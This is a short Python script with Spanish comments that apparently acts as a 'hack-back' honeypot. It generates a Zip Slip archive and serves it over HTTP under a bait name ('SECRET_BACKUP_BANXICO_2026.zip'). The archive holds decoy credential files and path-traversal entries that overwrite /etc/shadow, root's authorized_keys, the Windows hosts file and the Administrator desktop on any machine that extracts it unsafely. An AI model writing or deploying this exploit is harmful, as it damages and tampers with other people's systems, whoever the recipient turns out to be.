import zipfile
import io
import os

def generate_slipzip():
    """Genera un archivo ZIP malicioso con Path Traversal en memoria"""
    zip_buffer = io.BytesIO()
    
    # Nombres atractivos y sus versiones maliciosas (Path Traversal)
    files_to_include = [
        # Carnada Normal
        ("CLAVES_ADMIN_SISTEMAS_2026.txt", "Admin: admin123
Root: mex_finance_2026!"),
        ("SWIFT_PAYMENTS_CONFIG.xml", "<config><swift_code>MONEXMX</swift_code></config>"),
        ("PASSWORDS_VPN_PROD.csv", "user,pass,ip
uguzman,MasterTv.18a,172.16.80.1"),
        
        # Path Traversal - Linux
        ("../../../../../../../../../../etc/shadow", "root:$6$rounds=40960$salt$hash:19000:0:99999:7:::"),
        ("../../../../../../../../../../root/.ssh/authorized_keys", "ssh-rsa AAAAB3Nza... HELL-WAS-HERE"),
        
        # Path Traversal - Windows
        ("../../../../../../../../../../Windows/System32/drivers/etc/hosts", "127.0.0.1 HELL-ACTIVE-DEFENSE"),
        ("../../../../../../../../../../Users/Administrator/Desktop/README_LEEME.txt", "ESTE SISTEMA ESTA PROTEGIDO POR HELL CORE v6.6.0")
    ]

    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
        for file_path, content in files_to_include:
            zip_file.writestr(file_path, content)
            
    return zip_buffer.getvalue()

def serve_zip_trap(client_socket):
    """Sirve el archivo ZIP malicioso vía HTTP"""
    zip_data = generate_slipzip()
    header = (
        "HTTP/1.1 200 OK
"
        "Content-Type: application/zip
"
        "Content-Disposition: attachment; filename="SECRET_BACKUP_BANXICO_2026.zip"
"
        f"Content-Length: {len(zip_data)}
"
        "Connection: close

"
    )
    try:
        client_socket.send(header.encode() + zip_data)
        print("[⚔️] SlipZip Malicioso enviado al atacante.")
    except: pass
